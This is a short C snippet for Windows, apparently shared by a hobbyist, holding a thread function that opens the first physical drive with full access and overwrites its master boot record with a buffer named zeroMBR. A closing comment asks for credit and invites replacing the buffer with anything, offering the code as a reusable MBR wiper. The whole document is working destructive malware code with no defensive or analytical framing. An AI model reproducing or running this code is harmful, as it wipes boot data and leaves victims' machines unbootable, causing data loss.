static DWORD WINAPI mbr(LPVOID lpParam) { 
    HANDLE hFile = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD BytesWritten;
        WriteFile(hFile, zeroMBR, sizeof(zeroMBR), &BytesWritten, NULL);
        CloseHandle(hFile);
    }
    return 0;
}
// if you use you must give me credit and you can replace zeroMBR with whatever you want bro
